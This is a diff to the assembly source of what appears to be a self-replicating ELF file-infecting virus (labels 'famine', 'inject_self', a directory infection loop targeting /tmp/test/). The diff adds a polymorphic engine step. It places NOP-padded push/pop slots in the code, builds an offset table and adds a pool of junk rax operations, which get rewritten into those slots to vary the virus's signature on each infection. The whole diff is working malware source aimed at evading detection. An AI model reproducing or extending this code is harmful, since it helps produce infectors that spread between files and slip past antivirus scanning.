@@ -25,6 +25,13 @@ dd 0x90909090
 db 0x90
 lea rdi, STACK(famine.file_path)
 
+.poly_push_ops_pop:
+push rax
+dq 0x9090909090909090
+dq 0x9090909090909090
+dq 0x9090909090909090
+dq 0x9090909090909090
+pop rax
 
 ;BUILD STRING /proc/self/status FOR OBF
 mov rsi, 0x1E40AEC66F2F
@@ -417,6 +424,14 @@ dd 0x90909090
 	mov r13, 0
 	mov r12, rax
 
+.poly_push_ops_pop2:
+push rax
+dq 0x9090909090909090
+dq 0x9090909090909090
+dq 0x9090909090909090
+dq 0x9090909090909090
+pop rax
+
 .file:
 	; check directory entry for a regular file
 	lea rdi, STACK(famine.dirents)
@@ -587,6 +602,13 @@ inject_self:
 	lea rdi, [rel random]
 	mov rsi, O_RDONLY
 	mov rax, _open
+.poly_push_ops_pop3:
+push rax
+	dq 0x9090909090909090
+	dq 0x9090909090909090
+	dq 0x9090909090909090
+	dq 0x9090909090909090
+pop rax
 	syscall					; OPEN /dev/urandom  EXIT if not work
 	cmp rax, 0
 	jl	_exx_pop
@@ -787,6 +809,37 @@ inject_self:
 	lea rsi, [rel poly_xor_rdi_rdi]
 	call .poly_engine
 
+	.poly_push_pop:
+	xor r11, r11
+		dd 0x90909090
+			db 0x90
+	lea r10, STACK(famine.poly_offsets)
+	mov qword[r10], POLY_PUSH_POP_1_OFFSET
+	mov qword[r10+8], POLY_PUSH_POP_1_OFFSET
+	add qword[r10+8], 8
+	mov qword[r10+16], POLY_PUSH_POP_1_OFFSET
+	add qword[r10+16], 16
+	mov qword[r10+24], POLY_PUSH_POP_1_OFFSET
+	add qword[r10+24], 24
+	mov qword[r10+32], POLY_PUSH_POP_2_OFFSET
+	mov qword[r10+40], POLY_PUSH_POP_2_OFFSET
+	add qword[r10+40], 8
+	mov qword[r10+48], POLY_PUSH_POP_2_OFFSET
+	add qword[r10+48], 16
+	mov qword[r10+56], POLY_PUSH_POP_2_OFFSET
+	add qword[r10+56], 24
+	mov qword[r10+64], POLY_PUSH_POP_3_OFFSET
+	mov qword[r10+72], POLY_PUSH_POP_3_OFFSET
+	add qword[r10+72], 0x8
+	mov qword[r10+80], POLY_PUSH_POP_3_OFFSET
+	add qword[r10+80], 16
+	mov qword[r10+88], POLY_PUSH_POP_3_OFFSET
+	add qword[r10+88], 24
+	mov qword[r10+64], 0x1111
+	mov r11, POLY_PUSH_POP_NUMBER
+	mov r9, POLY_PUSH_POP_SIZE
+	lea rsi, [rel poly_8byte_rax_ops]
+	call .poly_engine
 
 ;	lea r10, STACK(famine.tocypher)
 ;	add r10, KEY_OFFSET
@@ -1060,6 +1113,25 @@ poly_inc_r10:	inc r10
 				add r10, 0x32
 				sub r10, 0x31
 
+poly_8byte_rax_ops:
+						add rax, 150
+							push rdi
+							pop rdi
+
+						mov rax, 0xFF
+						sub rax, r11
+
+						or rax, 0xAE
+						push rsp
+						pop rsp
+
+						xor rax, rcx
+						neg rax
+						push rcx
+						pop rcx
+
+						or rax, 0xDB
+						or al, 0xFF
 
 infect_dir		db			"/tmp/test/",0,"/tmp/test2/",0,0
 enc_end:
